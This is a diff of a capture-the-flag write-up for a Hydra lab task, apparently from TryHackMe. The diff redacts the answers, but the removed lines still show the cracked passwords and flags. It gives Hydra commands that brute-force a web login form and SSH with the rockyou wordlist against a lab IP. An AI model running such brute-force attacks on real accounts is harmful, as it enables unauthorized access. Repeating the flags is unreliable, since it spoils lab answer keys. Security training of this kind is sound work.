@@ -14,13 +14,13 @@
 [Task 2] Using Hydra 
 #1 Use Hydra to bruteforce molly's web password. What is flag 1?
 + Command : #hydra 10.10.165.3 -l molly -P /usr/share/wordlists/rockyou.txt http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect."
-cretentials---> molly:sunshine
-+ Answer : THM{2673a7dd116de68e85c48ec0b1f2612e}
+cretentials---> molly:.............
++ Answer : THM{..................}
 
 #2 Use Hydra to bruteforce molly's SSH password. What is flag 2?
 + Command : #hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.165.3 -t 4 ssh
-cretentials---> molly:butterfly
+cretentials---> molly:............
 	    #ssh molly@10.10.165.3
 	    #ls
             #cat flag2.txt 
-+ Answer  : THM{c8eeb0468febbadea859baeb33b2541b}
++ Answer  : THM{...........................}
